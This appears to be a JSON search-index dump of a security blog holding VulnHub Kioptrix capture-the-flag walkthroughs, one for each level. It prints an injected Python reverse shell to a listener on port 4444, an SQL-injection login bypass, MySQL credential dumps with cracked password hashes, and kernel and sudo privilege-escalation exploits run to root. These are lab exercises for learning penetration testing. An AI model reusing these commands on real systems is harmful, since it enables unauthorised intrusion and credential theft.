:::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.1.107. Ncat: Connection from 192.168.1.107:59717. whoami www-data Privilege EscalationLoneferret - Via Creds Found Look for SQL Credentials www-data@Kioptrix3:/home/www/kioptrix3.com$ grep -Rnw $(pwd)/* -ie &quot;connect&quot; --color=always 2&amp;gt;/dev/null /home/www/kioptrix3.com/core/lib/RemoteFiles.php:91: // connect to the remote server /home/www/kioptrix3.com/gallery/gheader.php:25: // Connect to MySQL /home/www/kioptrix3.com/gallery/install.BAK:96: // Try to connect to the database /home/www/kioptrix3.com/gallery/themes/black/stats.php:49://Connect to local host to check URL data /home/www/kioptrix3.com/gallery/themes/black/stats.php:75: $db = MYSQL_CONNECT($host,$user, $pass) OR DIE(&quot;Unable to connect to database&quot;); /home/www/kioptrix3.com/gallery/themes/black/stats.php:132://Connect to remote host to get initial URL data if there is no local data /home/www/kioptrix3.com/gallery/themes/black/stats.php:138: $db = MYSQL_CONNECT($host,$user, $pass) OR DIE(&quot;Unable to connect to database&quot;); View stats.php www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u lancore_gallarif -p Enter password: ERROR 1045 (28000): Access denied for user &#39;lancore_gallarif&#39;@&#39;localhost&#39; (using password: YES) Not the database we are looking for View gheader.php /gfunctions.php /gconfig.php Find configuration files www-data@Kioptrix3:/home/www/kioptrix3.com$ find $(pwd) 2&amp;gt; /dev/null | grep &quot;gfunctions\\|gconfig&quot; /home/www/kioptrix3.com/gallery/gfunctions.php /home/www/kioptrix3.com/gallery/BACK/gfunctions.php.bak /home/www/kioptrix3.com/gallery/gconfig.php View gconfig.php root:fuckeyou Access mysql to obtain more creds www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u lancore_gallarif -p Enter password: ERROR 1045 (28000): Access denied for user &#39;lancore_gallarif&#39;@&#39;localhost&#39; (using password: YES) www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u root -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 15 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu) Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the buffer. mysql&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | gallery | | mysql | +--------------------+ 3 rows in set (0.00 sec) mysql&amp;gt; use gallery Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql&amp;gt; show tables; +----------------------+ | Tables_in_gallery | +----------------------+ | dev_accounts | | gallarific_comments | | gallarific_galleries | | gallarific_photos | | gallarific_settings | | gallarific_stats | | gallarific_users | +----------------------+ 7 rows in set (0.00 sec) mysql&amp;gt; select * from dev_accounts; +----+------------+----------------------------------+ | id | username | password | +----+------------+----------------------------------+ | 1 | dreg | 0d3eccfb887aabd50f243b3f155c0f85 | # MD5 Hash | 2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | +----+------------+----------------------------------+ 2 rows in set (0.00 sec) Crack hash ┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95/exploit] └─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --show 0d3eccfb887aabd50f243b3f155c0f85:Mast3r 5badcaf789d3d1d09794d8f021f40f0e:starwars dreg:Mast3r loneferret:starwars Switch to loneferret Root - Via Buffer Overflow Check sudo access loneferret@Kioptrix3:~$ sudo -l sudo -l User loneferret may run the following commands on this host: (root) NOPASSWD: !/usr/bin/su (root) NOPASSWD: /usr/local/bin/ht loneferret@Kioptrix3:~$ Run ht loneferret@Kioptrix3:~$ sudo ht sudo ht Error opening terminal: unknown. loneferret@Kioptrix3:~$ export TERM=xterm ht 2.0.18 Search for exploits https://www.exploit-database.net/?id=17836 A bufferoverflow exploit where EIP is overwritten into spawning a shell Transfer exploit Exploit python exploit.py &amp;gt; output sudo ht $(cat output) Root - Via Sudo Edit /etc/sudoers w/ ht editor export TERM=xterm sudo ht ALT + F &amp;gt; Open &amp;gt; /etc/sudoers Replace !/usr/bin/su w/ /bin/su ALT + F &amp;gt; Save &amp;gt; Quit Obtain root loneferret@Kioptrix3:/home/www/kioptrix3.com$ sudo su root@Kioptrix3:/home/www/kioptrix3.com# whoami root root@Kioptrix3:/home/www/kioptrix3.com# Privilege Escalation to Root - 3 via Kernel Exploit Ran linpeas Search exploits for linux version 2.6.24 https://www.exploit-db.com/exploits/40839 Transfer exploit Compile &amp;amp; Exploit loneferret@Kioptrix3:/tmp$ nc 192.168.1.1 4444 &amp;gt; dirty.c loneferret@Kioptrix3:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt dirty.c:193:2: warning: no newline at end of file loneferret@Kioptrix3:/tmp$ chmod +x dirty; ./dirty /etc/passwd successfully backed up to /tmp/passwd.bak Please enter the new password: Complete line: firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash mmap: b7fe0000 CTRL + C loneferret@Kioptrix3:/tmp$ su firefart Password: firefart@Kioptrix3:/tmp# cd /root firefart@Kioptrix3:~# whoami firefart firefart@Kioptrix3:~# id uid=0(firefart) gid=0(root) groups=0(root) firefart@Kioptrix3:~# Obtain Root Flag " }, { "title": "Vulnhub - Kioptrix L2", "url": "/posts/Kioptrix-L2/", "categories": "Vulnhub, Linux", "tags": "exploit/sqli/auth-bypass, exploit/command-injection, linux-priv-esc/kernel-exploit", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Fri Dec 24 01:07:44 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/kioptrix2/192.168.1.102/scans/_full_tcp_nmap.txt -oX /root/vulnHub/kioptrix2/192.168.1.102/scans/xml/_full_tcp_nmap.xml 192.168.1.102adjust_timeouts2: packet supposedly had rtt of -539313 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -539313 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -362256 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -362256 microseconds. Ignoring time.Nmap scan report for 192.168.1.102Host is up, received arp-response (0.0014s latency).Scanned at 2021-12-24 01:07:45 +08 for 37sNot shown: 65528 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 3.9p1 (protocol 1.99)|_sshv1: Server supports SSHv1| ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)| 1024 35 149174282886581624883868648302761292182406879108668063702143177994710569161669502445416601666211201346192352271911333433971833283425439634231257314174441054335295864218587993634534355128377261436615077053235666774641007412196140534221696911370388178873572900977872600139866890316021962605461192127591516843621| 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBAOWJ2N2BPBPm0HxCi630ZxHtTNMh+uVkeYCkKVNxavZkcJdpfFTOGZp054sj27mVZVtCeNMHhzAUpvRisn/cH4k4plLd1m8HACAVPtcgRrshCzb7wzQikrP+byCVypE0RpkQcDya+ngDMVzrkA+9KQSR/5W6BjldLW60A5oZgyfvAAAAFQC/iRZe4LlaYXwHvYYDpjnoCPY3xQAAAIBKFGl/zr/u1JxCV8a9dIAMIE0rk0jYtwvpDCdBre450ruoLII/hsparzdJs898SMWX1kEzigzUdtobDVT8nWdJAVRHCm8ruy4IQYIdtjYowXD7hxZTy/F0xOsiTRWBYMQPe8lW1oA+xabqlnCO3ppjmBecVlCwEMoeefnwGWAkxwAAAIAKajcioQiMDYW7veV13Yjmag6wyIia9+V9aO8JmgMi3cNr04Vl0FF+n7OIZ5QYvpSKcQgRzwNylEW5juV0Xh96m2g3rqEvDd4kTttCDlOltPgP6q6Z8JI0IGzcIGYBy6UWdIxj9D7F2ccc7fAM2o22+qgFp+FFiLeFDVbRhYz4sg==| 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA4j5XFFw9Km2yphjpu1gzDBglGSpMxtR8zOvpH9gUbOMXXbCQeXgOK3rs4cs/j75G54jALm99Ky7tgToNaEuxmQmwnpYk9bntoDu9SkiT/hPZdOwq40yrfWIHzlUNWTpY3okTdf/YNUAdl4NOBOYbf0x/dsAdHHqSWnvZmruFA6M=80/tcp open http syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.0.52 (CentOS)111/tcp open rpcbind syn-ack ttl 64 2 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100024 1 617/udp status|_ 100024 1 620/tcp status443/tcp open ssl/http syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).| sslv2: | SSLv2 supported| ciphers: | SSL2_RC4_64_WITH_MD5| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5| SSL2_RC2_128_CBC_WITH_MD5| SSL2_DES_64_CBC_WITH_MD5| SSL2_RC4_128_WITH_MD5| SSL2_DES_192_EDE3_CBC_WITH_MD5|_ SSL2_RC4_128_EXPORT40_WITH_MD5| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_ssl-date: 2021-12-23T14:58:43+00:00; -2h09m38s from scanner time.| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: md5WithRSAEncryption| Not valid before: 2009-10-08T00:10:47| Not valid after: 2010-10-08T00:10:47| MD5: 01de 29f9 fbfb 2eb2 beaf e624 3157 090f| SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a| -----BEGIN CERTIFICATE-----| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkxMDA4MDAxMDQ3WhcN| MTAxMDA4MDAxMDQ3WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAN4duNVEr4aL| TUfsjacXKcCaRs1oTxsdNTIxkp7SV2PDD+mBY5shsXt/FMG7Upf4g605+W6ZEhfB| WpLXonDFaRIxxn4AGSOLg8q20kUt9p2HZufaSLSwfSwJ+CTMwYtN8AU0jhf3r0y8| jr+jjEU0HT4O4YXcnDRvbIUeHKedPPsTAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU| QAs+OwqZIYsWClQ2ZBav2uPP/mAwgegGA1UdIwSB4DCB3YAUQAs+OwqZIYsWClQ2| ZBav2uPP/mChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA| Hvq7KPeUTn36Sz/Au95TmC7aSkhIkGVHMRGhWe7KTEflqQffYTqJOS4xsu/FxDRy| 9IGOapsyILGEx57apuCYJW3tpwMUrpUXu/x9g3LM+VghiH0XxMOfbueVhqWZ+yP8| LisROr5u+FeGOBBIINAmpWUX2xEdB4p97WYzP03rEQU=|_-----END CERTIFICATE-----|_http-server-header: Apache/2.0.52 (CentOS)620/tcp open status syn-ack ttl 64 1 (RPC #100024)631/tcp open ipp syn-ack ttl 64 CUPS 1.1|_http-title: 403 Forbidden| http-methods: | Supported Methods: GET HEAD OPTIONS POST PUT|_ Potentially risky methods: PUT|_http-server-header: CUPS/1.13306/tcp open mysql syn-ack ttl 64 MySQL (unauthorized)MAC Address: 00:0C:29:B9:F7:A5 (VMware)Device type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6.9OS details: Linux 2.6.9, Linux 2.6.9 - 2.6.30TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=12/24%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=61OS:C4AD06%P=x86_64-pc-linux-gnu)SEQ(SP=C5%GCD=1%ISR=C6%TI=Z%CI=Z%II=I%TS=A)OS:OPS(O1=M5B4ST11NW2%O2=M5B4ST11NW2%O3=M5B4NNT11NW2%O4=M5B4ST11NW2%O5=M5B4OS:ST11NW2%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)OS:ECN(R=Y%DF=Y%TG=40%W=16D0%O=M5B4NNSNW2%CC=N%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=SOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%TG=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11NOS:W2%RD=0%Q=)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=4OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0OS:%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TOS:G=40%CD=S)Uptime guess: 0.002 days (since Fri Dec 24 01:05:30 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=197 (Good luck!)IP ID Sequence Generation: All zerosHost script results:|_clock-skew: -2h09m38sTRACEROUTEHOP RTT ADDRESS1 1.37 ms 192.168.1.102Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Dec 24 01:08:22 2021 -- 1 IP address (1 host up) scanned in 37.84 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/kioptrix2/192.168.1.102]└─# ffuf -u http://192.168.1.102/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.txt,.php&quot; -fw 21 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.1.102/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 21________________________________________________ [Status: 200, Size: 667, Words: 35, Lines: 32]index.php [Status: 200, Size: 667, Words: 35, Lines: 32]manual [Status: 301, Size: 315, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 8158 req/sec :: Duration: [0:00:03] :: Errors: 0 ::TCP/80 (HTTPS)FFUF Same as TCP/80Initial FootholdTCP/80 (HTTP) - SQLi + Command Injection Proceed to /manual Default Apache Documentation Proceed to /index.php Attempt SQLi Auth Bypass # OR 1=1# Attempt Command Injection `id` ;id Execute Reverse Shell ;python -c &#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.1.1&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; Obtain apache shell ┌──(root💀kali)-[~/vulnHub/kioptrix2/192.168.1.102] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.1.102. Ncat: Connection from 192.168.1.102:32778. sh-3.00$ whoami whoami apache sh-3.00$ Privilege EscalationRoot - Via Kernel Exploit Check for SQL Credentials, view index.php john:hiroshima Access mysql to obtain more creds bash-3.00$ mysql -u john -p Enter password: hiroshima Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 25 to server version: 4.1.22 Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the buffer. mysql&amp;gt; show databases; +----------+ | Database | +----------+ | mysql | | test | | webapp | +----------+ mysql&amp;gt; use webapp Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql&amp;gt; show tables; +------------------+ | Tables_in_webapp | +------------------+ | users | +------------------+ 1 row in set (0.00 sec) mysql&amp;gt; show columns from users; +----------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+--------------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | username | varchar(100) | YES | | NULL | | | password | varchar(10) | YES | | NULL | | +----------+--------------+------+-----+---------+-------+ 3 rows in set (0.00 sec) mysql&amp;gt; select * from users; +------+----------+------------+ | id | username | password | +------+----------+------------+ | 1 | admin | 5afac8d85f | | 2 | john | 66lajGGbla | +------+----------+------------+ 2 rows in set (0.00 sec) Tried to switch user to john w/ obtain creds, failed Ran linpeas Find Kernel Exploit ┌──(root💀kali)-[~/vulnHub/kioptrix2/192.168.1.102/exploit] └─# searchsploit 2.6 centos Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu linux/local/9545.c Transfer Exploit Compile &amp;amp; Exploit sh-3.00$ gcc 9545.c -o exploit; chmod +x exploit; ./exploit gcc 9545.c -o exploit; chmod +x exploit; ./exploit 9545.c:376:28: warning: no newline at end of file sh-3.00# whoami whoami root sh-3.00# cd /root cd /root sh-3.00# ls " }, { "title": "Vulnhub - Kioptrix L1", "url": "/posts/Kioptrix-L1/", "categories": "Vulnhub, Linux", "tags": "tcp/139-445-smb/exploit", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan┌──(root💀kali)-[~/vulnHub/Bob1.0.1/192.168.236.5]└─# cat ~/vulnHub/kioptrix1/192.168.1.104/scans/_full_tcp_nmap.txt # Nmap 7.92 scan initiated Sun Jan 23 14:24:09 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/kioptrix1/192.168.1.104/scans/_full_tcp_nmap.txt -oX /root/vulnHub/kioptrix1/192.168.1.104/scans/xml/_full_tcp_nmap.xml 192.168.1.104Nmap scan report for 192.168.1.104Host is up, received arp-response (0.00043s latency).Scanned at 2022-01-23 14:24:10 +08 for 31sNot shown: 65529 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)|_sshv1: Server supports SSHv1| ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537| 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=| 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=80/tcp open http syn-ack ttl 64 Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b| http-methods: | Supported Methods: GET HEAD OPTIONS TRACE|_ Potentially risky methods: TRACE|_http-title: Test Page for the Apache Web Server on Red Hat Linux111/tcp open rpcbind syn-ack ttl 64 2 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100024 1 1024/tcp status|_ 100024 1 1024/udp status139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)443/tcp open ssl/https syn-ack ttl 64 Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_ssl-date: 2022-01-23T07:26:30+00:00; +1h01m49s from scanner time.|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity/emailAddress=root@localhost.localdomain| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity/emailAddress=root@localhost.localdomain| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: md5WithRSAEncryption| Not valid before: 2009-09-26T09:32:06| Not valid after: 2010-09-26T09:32:06| MD5: 78ce 5293 4723 e7fe c28d 74ab 42d7 02f1| SHA-1: 9c42 91c3 bed2 a95b 983d 10ac f766 ecb9 8766 1d33| -----BEGIN CERTIFICATE-----| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkwOTI2MDkzMjA2WhcN| MTAwOTI2MDkzMjA2WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAM4BXiK5bWlS| ob4B6a9ALmKDbSxqoMcM3pvGHscFsJs+fHHn+CjU1DX44LPDNOwwOl6Uqb+GtZJv| 6juVetDwcTbbocC2BM+6x6gyV/H6aYuCssCwrOuVKWp7l9xVpadjITUmhh+uB81q| yqopt//Z4THww7SezLJQXi1+Grmp3iFDAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU| 7OdRS0NrbNB8gE9qUjcw8LF8xKAwgegGA1UdIwSB4DCB3YAU7OdRS0NrbNB8gE9q| Ujcw8LF8xKChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA| Vgrmpprfkmd8vy0E0UmZvWdIcDrIYRvUWcwSFwc6bGqJeJr0CYSB+jDQzA6Cu7nt| xjrlXxEjHFBBbF4iEMJDnuQTFGvICQIcrqJoH3lqAO73u4TeBDjhv5n+h+S37CHd| 1lvgRgoOay9dWaLKOyUThgKF2HcPWMZIj2froo5eihM=|_-----END CERTIFICATE-----| sslv2: | SSLv2 supported| ciphers: | SSL2_RC2_128_CBC_WITH_MD5| SSL2_RC4_128_EXPORT40_WITH_MD5| SSL2_DES_192_EDE3_CBC_WITH_MD5| SSL2_RC4_128_WITH_MD5| SSL2_RC4_64_WITH_MD5| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5|_ SSL2_DES_64_CBC_WITH_MD5| http-methods: |_ Supported Methods: GET HEAD POST|_http-title: 400 Bad Request1024/tcp open status syn-ack ttl 64 1 (RPC #100024)MAC Address: 00:0C:29:6C:89:B3 (VMware)Device type: general purposeRunning: Linux 2.4.XOS CPE: cpe:/o:linux:linux_kernel:2.4OS details: Linux 2.4.9 - 2.4.18 (likely embedded)TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/23%OT=22%CT=1%CU=40617%PV=Y%DS=1%DC=D%G=Y%M=000C29%TOS:M=61ECF4A9%P=x86_64-pc-linux-gnu)SEQ(SP=C8%GCD=2%ISR=CF%TI=Z%CI=Z%II=I%TOS:S=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=OS:M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%AOS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11OS:NW0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FFOS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%QOS:=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)Uptime guess: 0.005 days (since Sun Jan 23 14:17:54 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=200 (Good luck!)IP ID Sequence Generation: All zerosHost script results:|_clock-skew: 1h01m48s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 59044/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 26596/tcp): CLEAN (Couldn&#39;t connect)| Check 3 